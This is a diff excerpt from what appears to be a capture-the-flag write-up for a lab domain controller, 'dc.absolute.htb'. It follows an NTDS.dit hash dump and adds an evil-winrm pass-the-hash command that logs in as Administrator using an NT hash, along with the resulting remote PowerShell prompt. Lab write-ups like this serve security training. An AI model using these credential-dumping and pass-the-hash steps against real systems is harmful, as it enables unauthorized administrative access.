@@ -755,5 +755,18 @@ DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
 I have now dumped the contents of NTDS.dit
 
 ```python
+evil-winrm -i dc.absolute.htb -u Administrator -H '1f4a6093623653f6488d5aa24c75f2ea'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+```python
 
 ```
